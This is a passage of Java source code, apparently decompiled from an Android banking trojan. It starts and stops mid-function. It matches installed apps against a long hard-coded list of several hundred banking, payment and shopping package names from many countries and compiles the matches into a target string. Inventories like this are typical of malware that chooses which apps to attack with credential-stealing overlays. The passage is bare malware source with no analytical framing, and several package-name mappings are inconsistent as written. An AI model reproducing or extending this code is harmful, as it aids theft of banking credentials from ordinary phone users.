                str = str + "com.bankaustria.android.olb,";
            }
            if (applicationInfo.packageName.equals("com.bmo.mobile")) {
                str = str + "com.bmo.mobile,";
            }
            if (applicationInfo.packageName.equals("com.cibc.android.mobi")) {
                str = str + "com.cibc.android.mobi,";
            }
            if (applicationInfo.packageName.equals("com.rbc.mobile.android")) {
                str = str + "com.rbc.mobile.android,";
            }
            if (applicationInfo.packageName.equals("com.scotiabank.mobile")) {
                str = str + "com.scotiabank.mobile,";
            }
            if (applicationInfo.packageName.equals("com.td")) {
                str = str + "com.td,";
            }
            if (applicationInfo.packageName.equals("cz.airbank.android")) {
                str = str + "cz.airbank.android,";
            }
            if (applicationInfo.packageName.equals("eu.inmite.prj.kb.mobilbank")) {
                str = str + "eu.inmite.prj.kb.mobilbank,";
            }
            if (applicationInfo.packageName.equals("com.bankinter.launcher")) {
                str = str + "com.bankinter.launcher,";
            }
            if (applicationInfo.packageName.equals("com.kutxabank.android")) {
                str = str + "com.kutxabank.android,";
            }
            if (applicationInfo.packageName.equals("com.rsi")) {
                str = str + "com.rsi,";
            }
            if (applicationInfo.packageName.equals("com.tecnocom.cajalaboral")) {
                str = str + "com.tecnocom.cajalaboral,";
            }
            if (applicationInfo.packageName.equals("es.bancopopular.nbmpopular")) {
                str = str + "es.bancopopular.nbmpopular,";
            }
            if (applicationInfo.packageName.equals("es.evobanco.bancamovil")) {
                str = str + "es.evobanco.bancamovil,";
            }
            if (applicationInfo.packageName.equals("es.lacaixa.mobile.android.newwapicon")) {
                str = str + "es.lacaixa.mobile.android.newwapicon,";
            }
            if (applicationInfo.packageName.equals("com.dbs.hk.dbsmbanking")) {
                str = str + "com.dbs.hk.dbsmbanking,";
            }
            if (applicationInfo.packageName.equals("com.FubonMobileClient")) {
                str = str + "com.FubonMobileClient,";
            }
            if (applicationInfo.packageName.equals("com.hangseng.rbmobile")) {
                str = str + "com.hangseng.rbmobile,";
            }
            if (applicationInfo.packageName.equals("com.MobileTreeApp")) {
                str = str + "com.MobileTreeApp,";
            }
            if (applicationInfo.packageName.equals("com.mtel.androidbea")) {
                str = str + "com.mtel.androidbea,";
            }
            if (applicationInfo.packageName.equals("com.scb.breezebanking.hk")) {
                str = str + "com.scb.breezebanking.hk,";
            }
            if (applicationInfo.packageName.equals("hk.com.hsbc.hsbchkmobilebanking")) {
                str = str + "hk.com.hsbc.hsbchkmobilebanking,";
            }
            if (applicationInfo.packageName.equals("com.aff.otpdirekt")) {
                str = str + "com.aff.otpdirekt,";
            }
            if (applicationInfo.packageName.equals("com.ideomobile.hapoalim")) {
                str = str + "com.ideomobile.hapoalim,";
            }
            if (applicationInfo.packageName.equals("com.infrasofttech.indianBank")) {
                str = str + "com.infrasofttech.indianBank,";
            }
            if (applicationInfo.packageName.equals("com.mobikwik_new")) {
                str = str + "com.mobikwik_new,";
            }
            if (applicationInfo.packageName.equals("com.oxigen.oxigenwallet")) {
                str = str + "com.oxigen.oxigenwallet,";
            }
            if (applicationInfo.packageName.equals("jp.co.aeonbank.android.passbook")) {
                str = str + "jp.co.aeonbank.android.passbook,";
            }
            if (applicationInfo.packageName.equals("jp.co.netbk")) {
                str = str + "jp.co.netbk,";
            }
            if (applicationInfo.packageName.equals("jp.co.rakuten_bank.rakutenbank")) {
                str = str + "jp.co.rakuten_bank.rakutenbank,";
            }
            if (applicationInfo.packageName.equals("jp.co.sevenbank.AppPassbook")) {
                str = str + "jp.co.sevenbank.AppPassbook,";
            }
            if (applicationInfo.packageName.equals("jp.co.smbc.direct")) {
                str = str + "jp.co.smbc.direct,";
            }
            if (applicationInfo.packageName.equals("jp.mufg.bk.applisp.app")) {
                str = str + "jp.mufg.bk.applisp.app,";
            }
            if (applicationInfo.packageName.equals("com.barclays.ke.mobile.android.ui")) {
                str = str + "com.barclays.ke.mobile.android.ui,";
            }
            if (applicationInfo.packageName.equals("nz.co.anz.android.mobilebanking")) {
                str = str + "nz.co.anz.android.mobilebanking,";
            }
            if (applicationInfo.packageName.equals("nz.co.asb.asbmobile")) {
                str = str + "nz.co.asb.asbmobile,";
            }
            if (applicationInfo.packageName.equals("nz.co.bnz.droidbanking")) {
                str = str + "nz.co.bnz.droidbanking,";
            }
            if (applicationInfo.packageName.equals("nz.co.kiwibank.mobile")) {
                str = str + "nz.co.kiwibank.mobile,";
            }
            if (applicationInfo.packageName.equals("com.getingroup.mobilebanking")) {
                str = str + "com.getingroup.mobilebanking,";
            }
            if (applicationInfo.packageName.equals("eu.eleader.mobilebanking.pekao.firm")) {
                str = str + "eu.eleader.mobilebanking.pekao.firm,";
            }
            if (applicationInfo.packageName.equals("eu.eleader.mobilebanking.pekao")) {
                str = str + "eu.eleader.mobilebanking.pekao,";
            }
            if (applicationInfo.packageName.equals("eu.eleader.mobilebanking.raiffeisen")) {
                str = str + "eu.eleader.mobilebanking.raiffeisen,";
            }
            if (applicationInfo.packageName.equals("pl.bzwbk.bzwbk24")) {
                str = str + "pl.bzwbk.bzwbk24,";
            }
            if (applicationInfo.packageName.equals("pl.ipko.mobile")) {
                str = str + "pl.ipko.mobile,";
            }
            if (applicationInfo.packageName.equals("pl.mbank")) {
                str = str + "pl.mbank,";
            }
            if (applicationInfo.packageName.equals("alior.bankingapp.android")) {
                str = str + "alior.bankingapp.android,";
            }
            if (applicationInfo.packageName.equals("com.comarch.mobile.banking.bgzbnpparibas.biznes")) {
                str = str + "com.comarch.mobile.banking.bgzbnpparibas.biznes,";
            }
            if (applicationInfo.packageName.equals("com.comarch.security.mobilebanking")) {
                str = str + "com.comarch.security.mobilebanking,";
            }
            if (applicationInfo.packageName.equals("com.empik.empikapp")) {
                str = str + "com.empik.empikapp,";
            }
            if (applicationInfo.packageName.equals("com.empik.empikfoto")) {
                str = str + "com.empik.empikfoto,";
            }
            if (applicationInfo.packageName.equals("com.finanteq.finance.ca")) {
                str = str + "com.finanteq.finance.ca,";
            }
            if (applicationInfo.packageName.equals("com.orangefinansek")) {
                str = str + "com.orangefinanse,";
            }
            if (applicationInfo.packageName.equals("eu.eleader.mobilebanking.invest")) {
                str = str + "eu.eleader.mobilebanking.invest,";
            }
            if (applicationInfo.packageName.equals("pl.aliorbank.aib")) {
                str = str + "pl.aliorbank.aib,";
            }
            if (applicationInfo.packageName.equals("pl.allegro")) {
                str = str + "pl.allegro,";
            }
            if (applicationInfo.packageName.equals("pl.bosbank.mobile")) {
                str = str + "pl.bosbank.mobile,";
            }
            if (applicationInfo.packageName.equals("pl.bph")) {
                str = str + "pl.bph,";
            }
            if (applicationInfo.packageName.equals("pl.bps.bankowoscmobilna")) {
                str = str + "pl.bps.bankowoscmobilna,";
            }
            if (applicationInfo.packageName.equals("pl.bzwbk.ibiznes24")) {
                str = str + "pl.bzwbk.ibiznes24,";
            }
            if (applicationInfo.packageName.equals("pl.bzwbk.mobile.tab.bzwbk24")) {
                str = str + "pl.bzwbk.mobile.tab.bzwbk24,";
            }
            if (applicationInfo.packageName.equals("pl.ceneo")) {
                str = str + "pl_pl.ceneo,";
            }
            if (applicationInfo.packageName.equals("pl.com.rossmann.centauros")) {
                str = str + "pl.com.rossmann.centauros,";
            }
            if (applicationInfo.packageName.equals("pl.fmbank.smart")) {
                str = str + "pl.fmbank.smart,";
            }
            if (applicationInfo.packageName.equals("pl.ideabank.mobilebanking")) {
                str = str + "pl.ideabank.mobilebanking,";
            }
            if (applicationInfo.packageName.equals("pl.ing.mojeing")) {
                str = str + "pl.ing.mojeing,";
            }
            if (applicationInfo.packageName.equals("pl.millennium.corpApp")) {
                str = str + "pl.millennium.corpApp,";
            }
            if (applicationInfo.packageName.equals("pl.orange.mojeorange")) {
                str = str + "pl.orange.mojeorange,";
            }
            if (applicationInfo.packageName.equals("pl.pkobp.iko")) {
                str = str + "pl.pkobp.iko,";
            }
            if (applicationInfo.packageName.equals("pl.pkobp.ipkobiznes")) {
                str = str + "pl.pkobp.ipkobiznes,";
            }
            if (applicationInfo.packageName.equals("com.kuveytturk.mobil")) {
                str = str + "com.kuveytturk.mobil,";
            }
            if (applicationInfo.packageName.equals("com.magiclick.odeabank")) {
                str = str + "com.magiclick.odeabank,";
            }
            if (applicationInfo.packageName.equals("com.mobillium.papara")) {
                str = str + "com.mobillium.papara,";
            }
            if (applicationInfo.packageName.equals("com.pozitron.albarakaturk")) {
                str = str + "com.pozitron.albarakaturk,";
            }
            if (applicationInfo.packageName.equals("com.teb")) {
                str = str + "com.teb,";
            }
            if (applicationInfo.packageName.equals("ccom.tmob.denizbank")) {
                str = str + "com.tmob.denizbank,";
            }
            if (applicationInfo.packageName.equals("com.tmob.tabletdeniz")) {
                str = str + "com.tmob.tabletdeniz,";
            }
            if (applicationInfo.packageName.equals("com.vakifbank.mobilel")) {
                str = str + "com.vakifbank.mobile,";
            }
            if (applicationInfo.packageName.equals("tr.com.sekerbilisim.mbank")) {
                str = str + "tr.com.sekerbilisim.mbank,";
            }
            if (applicationInfo.packageName.equals("wit.android.bcpBankingApp.millenniumPL")) {
                str = str + "wit.android.bcpBankingApp.millenniumPL,";
            }
            if (applicationInfo.packageName.equals("com.advantage.RaiffeisenBank")) {
                str = str + "com.advantage.RaiffeisenBank,";
            }
            if (applicationInfo.packageName.equals("hr.asseco.android.jimba.mUCI.ro")) {
                str = str + "hr.asseco.android.jimba.mUCI.ro,";
            }
            if (applicationInfo.packageName.equals("may.maybank.android")) {
                str = str + "may.maybank.android,";
            }
            if (applicationInfo.packageName.equals("ro.btrl.mobile")) {
                str = str + "ro.btrl.mobile,";
            }
            if (applicationInfo.packageName.equals("com.amazon.mShop.android.shopping") || applicationInfo.packageName.equals("com.amazon.windowshop")) {
                str = str + "com.amazon.mShop.android.shopping,";
            }
            if (applicationInfo.packageName.equals("com.ebay.mobile")) {
                str = str + "com.ebay.mobile,";
            }
            if (applicationInfo.packageName.equals("ru.sberbankmobile") || applicationInfo.packageName.equals("ru.sberbank.spasibo") || applicationInfo.packageName.equals("ru.sberbank_sbbol") || applicationInfo.packageName.equals("ru.sberbank.mobileoffice") || applicationInfo.packageName.equals("ru.sberbank.sberbankir")) {
                str = str + "ru.sberbankmobile,";
            }
            if (applicationInfo.packageName.equals("ru.alfabank.mobile.android") || applicationInfo.packageName.equals("ru.alfabank.oavdo.amc") || applicationInfo.packageName.equals("by.st.alfa") || applicationInfo.packageName.equals("ru.alfabank.sense") || applicationInfo.packageName.equals("ru.alfadirect.app")) {
                str = str + "ru.alfabank.mobile.android,";
            }
            if (applicationInfo.packageName.equals("ru.mw")) {
                str = str + "ru.mw,";
            }
            if (applicationInfo.packageName.equals("com.idamob.tinkoff.android") || applicationInfo.packageName.equals("ru.tcsbank.c2c") || applicationInfo.packageName.equals("ru.tinkoff.mgp") || applicationInfo.packageName.equals("ru.tinkoff.sme") || applicationInfo.packageName.equals("ru.tinkoff.goabroad")) {
                str = str + "com.idamob.tinkoff.android,";
            }
            if (applicationInfo.packageName.equals("ru.vtb24.mobilebanking.android") || applicationInfo.packageName.equals("ru.bm.mbm") || applicationInfo.packageName.equals("com.vtb.mobilebank") || applicationInfo.packageName.equals("com.bssys.VTBClient") || applicationInfo.packageName.equals("com.bssys.vtb.mobileclient")) {
                str = str + "ru.vtb24.mobilebanking.android,";
            }
            if (applicationInfo.packageName.equals("com.akbank.android.apps.akbank_direkt") || applicationInfo.packageName.equals("com.akbank.android.apps.akbank_direkt_tablet") || applicationInfo.packageName.equals("com.akbank.softotp") || applicationInfo.packageName.equals("com.akbank.android.apps.akbank_direkt_tablet_20") || applicationInfo.packageName.equals("com.fragment.akbank")) {
                str = str + "com.akbank.android.apps.akbank_direkt,";
            }
            if (applicationInfo.packageName.equals("com.ykb.android") || applicationInfo.packageName.equals("com.ykb.android.mobilonay") || applicationInfo.packageName.equals("com.ykb.avm") || applicationInfo.packageName.equals("com.ykb.androidtablet") || applicationInfo.packageName.equals("com.veripark.ykbaz")) {
                str = str + "com.ykb.android,";
            }
            if (applicationInfo.packageName.equals("com.softtech.iscek") || applicationInfo.packageName.equals("com.yurtdisi.iscep") || applicationInfo.packageName.equals("com.softtech.isbankasi") || applicationInfo.packageName.equals("com.monitise.isbankmoscow")) {
                str = str + "com.softtech.iscek,";
            }
            if (applicationInfo.packageName.equals("com.finansbank.mobile.cepsube") || applicationInfo.packageName.equals("finansbank.enpara") || applicationInfo.packageName.equals("com.magiclick.FinansPOS") || applicationInfo.packageName.equals("com.matriksdata.finansyatirim") || applicationInfo.packageName.equals("finansbank.enpara.sirketim") || applicationInfo.packageName.equals("com.vipera.ts.starter.QNB") || applicationInfo.packageName.equals("com.redrockdigimark")) {
                str = str + "com.finansbank.mobile.cepsube,";
            }
            if (applicationInfo.packageName.equals("com.garanti.cepsubesi") || applicationInfo.packageName.equals("com.garanti.cepbank") || applicationInfo.packageName.equals("com.garantibank.cepsubesiro") || applicationInfo.packageName.equals("com.matriksdata.finansyatirim") || applicationInfo.packageName.equals("biz.mobinex.android.apps.cep_sifrematik") || applicationInfo.packageName.equals("com.garantiyatirim.fx")) {
                str = str + "com.garanti.cepsubesi,";
            }
            if (applicationInfo.packageName.equals("com.tmobtech.halkbank") || applicationInfo.packageName.equals("com.SifrebazCep") || applicationInfo.packageName.equals("eu.newfrontier.iBanking.mobile.Halk.Retail") || applicationInfo.packageName.equals("tr.com.tradesoft.tradingsystem.gtpmobile.halk") || applicationInfo.packageName.equals("com.DijitalSahne.EnYakinHalkbank")) {
                str = str + "com.tmobtech.halkbank,";
            }
            if (applicationInfo.packageName.equals("com.ziraat.ziraatmobil") || applicationInfo.packageName.equals("com.ziraat.ziraattablet") || applicationInfo.packageName.equals("com.matriksmobile.android.ziraatTrader") || applicationInfo.packageName.equals("com.matriksdata.ziraatyatirim.pad")) {
                str = str + "com.ziraat.ziraatmobil,";
            }
            if (applicationInfo.packageName.equals("de.comdirect.android")) {
                str = str + "de.comdirect.android,";
            }
            if (applicationInfo.packageName.equals("de.commerzbanking.mobil")) {
                str = str + "de.commerzbanking.mobil,";
            }
            if (applicationInfo.packageName.equals("de.consorsbank")) {
                str = str + "de.consorsbank,";
            }
            if (applicationInfo.packageName.equals("com.db.mm.deutschebank")) {
                str = str + "com.db.mm.deutschebank,";
            }
            if (applicationInfo.packageName.equals("de.dkb.portalapp") || applicationInfo.packageName.equals("com.de.dkb.portalapp")) {
                str = str + "de.dkb.portalapp,";
            }
            if (applicationInfo.packageName.equals("com.ing.diba.mbbr2")) {
                str = str + "com.ing.diba.mbbr2,";
            }
            if (applicationInfo.packageName.equals("de.postbank.finanzassistent")) {
                str = str + "de.postbank.finanzassistent,";
            }
            if (applicationInfo.packageName.equals("mobile.santander.de")) {
                str = str + "mobile.santander.de,";
            }
            if (applicationInfo.packageName.equals("de.fiducia.smartphone.android.banking.vr")) {
                str = str + "de.fiducia.smartphone.android.banking.vr,";
            }
            if (applicationInfo.packageName.equals("fr.creditagricole.androidapp")) {
                str = str + "fr.creditagricole.androidapp,";
            }
            if (applicationInfo.packageName.equals("fr.axa.monaxa")) {
                str = str + "fr.axa.monaxa,";
            }
            if (applicationInfo.packageName.equals("fr.banquepopulaire.cyberplus")) {
                str = str + "fr.banquepopulaire.cyberplus,";
            }
            if (applicationInfo.packageName.equals("net.bnpparibas.mescomptes")) {
                str = str + "net.bnpparibas.mescomptes,";
            }
            if (applicationInfo.packageName.equals("com.boursorama.android.clients")) {
                str = str + "com.boursorama.android.clients,";
            }
            if (applicationInfo.packageName.equals("com.caisseepargne.android.mobilebanking")) {
                str = str + "com.caisseepargne.android.mobilebanking,";
            }
            if (applicationInfo.packageName.equals("fr.lcl.android.customerarea")) {
                str = str + "fr.lcl.android.customerarea,";
            }
            if (applicationInfo.packageName.equals("com.paypal.android.p2pmobile")) {
                str = str + "com.paypal.android.p2pmobile,";
            }
            if (applicationInfo.packageName.equals("com.wf.wellsfargomobile") || applicationInfo.packageName.equals("com.wf.wellsfargomobile.tablet") || applicationInfo.packageName.equals("com.wellsFargo.ceomobile")) {
                str = str + "com.wf.wellsfargomobile,";
            }
            if (applicationInfo.packageName.equals("com.usbank.mobilebanking")) {
                str = str + "com.usbank.mobilebanking,";
            }
            if (applicationInfo.packageName.equals("com.usaa.mobile.android.usaa")) {
                str = str + "com.usaa.mobile.android.usaa,";
            }
            if (applicationInfo.packageName.equals("com.suntrust.mobilebanking")) {
                str = str + "com.suntrust.mobilebanking,";
            }
            if (applicationInfo.packageName.equals("com.moneybookers.skrillpayments.neteller")) {
                str = str + "com.moneybookers.skrillpayments.neteller,";
            }
            if (applicationInfo.packageName.equals("com.moneybookers.skrillpayments")) {
                str = str + "com.moneybookers.skrillpayments,";
            }
            if (applicationInfo.packageName.equals("com.clairmail.fth")) {
                str = str + "com.clairmail.fth,";
            }
            if (applicationInfo.packageName.equals("com.konylabs.capitalone") || applicationInfo.packageName.equals("com.yinzcam.facilities.verizon")) {
                str = str + "com.konylabs.capitalone,";
            }
            if (applicationInfo.packageName.equals("com.chase.sig.android")) {
                str = str + "com.chase.sig.android,";
            }
            if (applicationInfo.packageName.equals("com.infonow.bofa") || applicationInfo.packageName.equals("com.bankofamerica.cashpromobile")) {
                str = str + "com.infonow.bofa,";
            }
            if (applicationInfo.packageName.equals("uk.co.bankofscotland.businessbank") || applicationInfo.packageName.equals("com.grppl.android.shell.BOS")) {
                str = str + "uk.co.bankofscotland.businessbank,";
            }
            if (applicationInfo.packageName.equals("com.rbs.mobile.android.natwestoffshore") || applicationInfo.packageName.equals("com.rbs.mobile.android.natwest") || applicationInfo.packageName.equals("com.rbs.mobile.android.natwestbandc")) {
                str = str + "com.rbs.mobile.android.natwestoffshore,";
            }
            if (applicationInfo.packageName.equals("com.rbs.mobile.investisir") || applicationInfo.packageName.equals("com.phyder.engage") || applicationInfo.packageName.equals("com.rbs.mobile.android.rbs") || applicationInfo.packageName.equals("com.rbs.mobile.android.rbsbandc")) {
                str = str + "com.rbs.mobile.investisir,";
            }
            if (applicationInfo.packageName.equals("uk.co.santander.santanderUK") || applicationInfo.packageName.equals("uk.co.santander.businessUK.bb") || applicationInfo.packageName.equals("com.sovereign.santander")) {
                str = str + "uk.co.santander.santanderUK,";
            }
            if (applicationInfo.packageName.equals("com.ifs.banking.fiid4202") || applicationInfo.packageName.equals("com.fi6122.godough")) {
                str = str + "com.ifs.banking.fiid4202,";
            }
            if (applicationInfo.packageName.equals("com.rbs.mobile.android.ubr")) {
                str = str + "com.rbs.mobile.android.ubr,";
            }
            if (applicationInfo.packageName.equals("com.htsu.hsbcpersonalbanking")) {
                str = str + "com.htsu.hsbcpersonalbanking,";
            }
            if (applicationInfo.packageName.equals("com.grppl.android.shell.halifax")) {
                str = str + "com.grppl.android.shell.halifax,";
            }
            if (applicationInfo.packageName.equals("com.grppl.android.shell.CMBlloydsTSB73")) {
                str = str + "com.grppl.android.shell.CMBlloydsTSB73,";
            }
            if (applicationInfo.packageName.equals("com.barclays.android.barclaysmobilebanking")) {
                str = str + "com.barclays.android.barclaysmobilebanking,";
            }
            if (applicationInfo.packageName.equals("com.unionbank.ecommerce.mobile.android") || applicationInfo.packageName.equals("com.unionbank.ecommerce.mobile.commercial.legacy")) {
                str = str + "com.unionbank.ecommerce.mobile.android,";
            }
            if (applicationInfo.packageName.equals("com.snapwork.IDBI") || applicationInfo.packageName.equals("com.idbibank.abhay_card") || applicationInfo.packageName.equals("src.com.idbi") || applicationInfo.packageName.equals("com.idbi.mpassbook")) {
                str = str + "com.unionbank.ecommerce.mobile.android,";
            }
            if (applicationInfo.packageName.equals("com.ing.mobile")) {
                str = str + "com.ing.mobile,";
            }
            if (applicationInfo.packageName.equals("com.snapwork.hdfc")) {
                str = str + "com.snapwork.hdfc,";
            }
            if (applicationInfo.packageName.equals("com.sbi.SBIFreedomPlus")) {
                str = str + "com.sbi.SBIFreedomPlus,";
            }
            if (applicationInfo.packageName.equals("hdfcbank.hdfcquickbank")) {
                str = str + "hdfcbank.hdfcquickbank,";
            }
            if (applicationInfo.packageName.equals("com.csam.icici.bank.imobile")) {
                str = str + "com.csam.icici.bank.imobile,";
            }
            if (applicationInfo.packageName.equals("in.co.bankofbaroda.mpassbook")) {
                str = str + "in.co.bankofbaroda.mpassbook,";
            }
            if (applicationInfo.packageName.equals("com.axis.mobile")) {
                str = str + "com.axis.mobile,";
            }
            if (applicationInfo.packageName.equals("cz.csob.smartbanking")) {
                str = str + "cz.csob.smartbanking,";
            }
            if (applicationInfo.packageName.equals("cz.sberbankcz")) {
                str = str + "cz.sberbankcz,";
            }
            if (applicationInfo.packageName.equals("sk.sporoapps.accounts") || applicationInfo.packageName.equals("sk.sporoapps.skener")) {
                str = str + "sk.sporoapps.accounts,";
            }
            if (applicationInfo.packageName.equals("com.cleverlance.csas.servis24")) {
                str = str + "com.cleverlance.csas.servis24,";
            }
            if (applicationInfo.packageName.equals("org.westpac.bank") || applicationInfo.packageName.equals("nz.co.westpac")) {
                str = str + "org.westpac.bank,nz.co.westpac,";
            }
            if (applicationInfo.packageName.equals("au.com.suncorp.SuncorpBank")) {
                str = str + "au.com.suncorp.SuncorpBank,";
            }
            if (applicationInfo.packageName.equals("org.stgeorge.bank")) {
                str = str + "org.stgeorge.bank,";
            }
            if (applicationInfo.packageName.equals("org.banksa.bank")) {
                str = str + "org.banksa.bank,";
            }
            if (applicationInfo.packageName.equals("au.com.newcastlepermanent")) {
                str = str + "au.com.newcastlepermanent,";
            }
            if (applicationInfo.packageName.equals("au.com.nab.mobile")) {
                str = str + "au.com.nab.mobile,";
            }
            if (applicationInfo.packageName.equals("au.com.mebank.banking")) {
                str = str + "au.com.mebank.banking,";
            }
            if (applicationInfo.packageName.equals("au.com.ingdirect.android") || applicationInfo.packageName.equals("MyING.be")) {
                str = str + "au.com.ingdirect.android,";
            }
            if (applicationInfo.packageName.equals("com.imb.banking2")) {
                str = str + "com.imb.banking2,";
            }
            if (applicationInfo.packageName.equals("com.fusion.ATMLocator")) {
                str = str + "com.fusion.ATMLocator,";
            }
            if (applicationInfo.packageName.equals("au.com.cua.mb")) {
                str = str + "au.com.cua.mb,";
            }
            if (applicationInfo.packageName.equals("com.commbank.netbank") || applicationInfo.packageName.equals("com.cba.android.netbank")) {
                str = str + "com.commbank.netbank,";
            }
            if (applicationInfo.packageName.equals("com.citibank.mobile.au") || applicationInfo.packageName.equals("com.citibank.mobile.uk") || applicationInfo.packageName.equals("com.citi.citimobile")) {
                str = str + "com.citibank.mobile.au,";
            }
            if (applicationInfo.packageName.equals("org.bom.bank")) {
                str = str + "org.bom.bank,";
            }
            if (applicationInfo.packageName.equals("com.bendigobank.mobile") || applicationInfo.packageName.equals("me.doubledutch.hvdnz.cbnationalconference2016")) {
                str = str + "com.bendigobank.mobile,";
            }
            if (applicationInfo.packageName.equals("au.com.bankwest.mobile")) {
                str = str + "au.com.bankwest.mobile,";
            }
            if (applicationInfo.packageName.equals("com.bankofqueensland.boq")) {
                str = str + "com.bankofqueensland.boq,";
            }
            if (applicationInfo.packageName.equals("com.anz.android.gomoney") || applicationInfo.packageName.equals("com.anz.android") || applicationInfo.packageName.equals("com.anz.SingaporeDigitalBanking") || applicationInfo.packageName.equals("com.anzspot.mobile") || applicationInfo.packageName.equals("com.crowdcompass.appSQ0QACAcYJ") || applicationInfo.packageName.equals("com.arubanetworks.atmanz") || applicationInfo.packageName.equals("com.quickmobile.anzirevents15")) {
                str = str + "com.anz.android.gomoney,";
            }
            if (applicationInfo.packageName.equals("at.volksbank.volksbankmobile") || applicationInfo.packageName.equals("de.fiducia.smartphone.android.banking.vr") || applicationInfo.packageName.equals("it.volksbank.android") || applicationInfo.packageName.equals("it.secservizi.mobile.atime.bpaa") || applicationInfo.packageName.equals("de.fiducia.smartphone.android.securego.vr") || applicationInfo.packageName.equals("com.unionbank.ecommerce.mobile.commercial.legacy")) {
                str = str + "at.volksbank.volksbankmobile,";
            }
            if (applicationInfo.packageName.equals("com.isis_papyrus.raiffeisen_pay_eyewdg")) {
                str = str + "com.isis_papyrus.raiffeisen_pay_eyewdg,";
            }
            if (applicationInfo.packageName.equals("at.easybank.mbanking") || applicationInfo.packageName.equals("at.easybank.tablet") || applicationInfo.packageName.equals("at.easybank.securityapp")) {
                str = str + "at.easybank.mbanking,";
            }
            if (applicationInfo.packageName.equals("at.bawag.mbanking") || applicationInfo.packageName.equals("com.bawagpsk.securityapp") || applicationInfo.packageName.equals("at.psa.app.bawag")) {
                str = str + "at.bawag.mbanking,";
            }
            if (applicationInfo.packageName.equals("com.pozitron.iscep")) {
                str = str + "com.pozitron.iscep,";
            }
            if (applicationInfo.packageName.equals("com.vakifbank.mobile") || applicationInfo.packageName.equals("com.pozitron.vakifbank")) {
                str = str + "com.vakifbank.mobile,";
            }
            if (applicationInfo.packageName.equals("com.starfinanz.smob.android.sfinanzstatus") || applicationInfo.packageName.equals("com.starfinanz.mobile.android.pushtan") || applicationInfo.packageName.equals("com.entersekt.authapp.sparkasse") || applicationInfo.packageName.equals("com.starfinanz.smob.android.sfinanzstatus.tablet")) {
                str = str + "com.starfinanz.smob.android.sfinanzstatus,";
            }
            if (applicationInfo.packageName.equals("com.starfinanz.smob.android.sbanking")) {
                str = str + "com.starfinanz.smob.android.sbanking,";
            }
            if (applicationInfo.packageName.equals("com.palatine.android.mobilebanking.prod")) {
                str = str + "com.palatine.android.mobilebanking.prod,";
            }
            if (applicationInfo.packageName.equals("fr.laposte.lapostemobile") || applicationInfo.packageName.equals("fr.laposte.lapostetablet")) {
                str = str + "fr.laposte.lapostemobile,";
            }
            if (applicationInfo.packageName.equals("com.cm_prod.bad") || applicationInfo.packageName.equals("com.cm_prod.epasal") || applicationInfo.packageName.equals("com.cm_prod_tablet.bad") || applicationInfo.packageName.equals("com.cm_prod.nosactus")) {
                str = str + "com.cm_prod.bad,";
            }
            if (applicationInfo.packageName.equals("mobi.societegenerale.mobile.lappli")) {
                str = str + "mobi.societegenerale.mobile.lappli,";
            }
            if (applicationInfo.packageName.equals("com.bbva.netcash")) {
                str = str + "com.bbva.netcash,";
            }
            if (applicationInfo.packageName.equals("com.bbva.bbvacontigo") || applicationInfo.packageName.equals("com.bbva.bbvawallet")) {
                str = str + "com.bbva.bbvacontigo,";
            }
            if (applicationInfo.packageName.equals("es.bancosantander.apps") || applicationInfo.packageName.equals("com.santander.app")) {
                str = str + "es.bancosantander.apps,";
            }
            if (applicationInfo.packageName.equals("es.cm.android") || applicationInfo.packageName.equals("es.cm.android.tablet") || applicationInfo.packageName.equals("com.bankia.wallet")) {
                str = str + "es.cm.android,";
            }
            if (applicationInfo.packageName.equals("com.jiffyondemand.user")) {
                str = str + "com.jiffyondemand.user,";
            }
            if (applicationInfo.packageName.equals("com.latuabancaperandroid")) {
                str = str + "com.latuabancaperandroid,";
            }
            if (applicationInfo.packageName.equals("com.latuabanca_tabperandroid")) {
                str = str + "com.latuabanca_tabperandroid,";
            }
            if (applicationInfo.packageName.equals("com.lynxspa.bancopopolare")) {
                str = str + "com.lynxspa.bancopopolare,";
            }
            if (applicationInfo.packageName.equals("com.unicredit")) {
                str = str + "com.unicredit,";
            }
            if (applicationInfo.packageName.equals("it.bnl.apps.banking")) {
                str = str + "it.bnl.apps.banking,";
            }
            if (applicationInfo.packageName.equals("it.bnl.apps.enterprise.bnlpay")) {
                str = str + "it.bnl.apps.enterprise.bnlpay,";
            }
            if (applicationInfo.packageName.equals("it.bpc.proconl.mbplus")) {
                str = str + "it.bpc.proconl.mbplus,";
            }
            if (applicationInfo.packageName.equals("it.copergmps.rt.pf.android.sp.bmps")) {
                str = str + "it.copergmps.rt.pf.android.sp.bmps,";
            }
            if (applicationInfo.packageName.equals("it.gruppocariparma.nowbanking")) {
                str = str + "it.gruppocariparma.nowbanking,";
            }
            if (applicationInfo.packageName.equals("it.ingdirect.app")) {
                str = str + "it.ingdirect.app,";
            }
            if (applicationInfo.packageName.equals("it.nogood.container")) {
                str = str + "it.nogood.container,";
            }
            if (applicationInfo.packageName.equals("it.popso.SCRIGNOapp")) {
                str = str + "it.popso.SCRIGNOapp,";
            }
            if (applicationInfo.packageName.equals("posteitaliane.posteapp.apppostepay")) {
                str = str + "posteitaliane.posteapp.apppostepay,";
            }
            if (applicationInfo.packageName.equals("com.abnamro.nl.mobile.payments")) {
                str = str + "com.abnamro.nl.mobile.payments,";
            }
            if (applicationInfo.packageName.equals("com.triodos.bankingnl")) {
                str = str + "com.triodos.bankingnl,";
            }
            if (applicationInfo.packageName.equals("nl.asnbank.asnbankieren")) {
                str = str + "nl.asnbank.asnbankieren,";
            }
            if (applicationInfo.packageName.equals("nl.snsbank.mobielbetalen")) {
                str = str + "nl.snsbank.mobielbetalen,";
            }
            if (applicationInfo.packageName.equals("com.btcturk")) {
                str = str + "com.btcturk,";
            }
            if (applicationInfo.packageName.equals("com.finansbank.mobile.cepsube")) {
                str = str + "com.finansbank.mobile.cepsube,";
            }
            if (applicationInfo.packageName.equals("com.ingbanktr.ingmobil")) {
                str = str + "com.ingbanktr.ingmobil,";
            }
            if (applicationInfo.packageName.equals("com.kuveytturk.mobil")) {
                str = str + "com.kuveytturk.mobil,";
            }
            if (applicationInfo.packageName.equals("com.magiclick.odeabank")) {
                str = str + "com.magiclick.odeabank,";
            }
            if (applicationInfo.packageName.equals("com.mobillium.papara")) {
                str = str + "com.mobillium.papara,";
            }
            if (applicationInfo.packageName.equals("com.pozitron.albarakaturk")) {
                str = str + "com.pozitron.albarakaturk,";
            }
            if (applicationInfo.packageName.equals("com.teb")) {
                str = str + "com.teb,";
            }
            if (applicationInfo.packageName.equals("com.tmob.denizbank")) {
                str = str + "com.tmob.denizbank,";
            }
            if (applicationInfo.packageName.equals("com.ykb.android")) {
                str = str + "com.ykb.android,";
            }
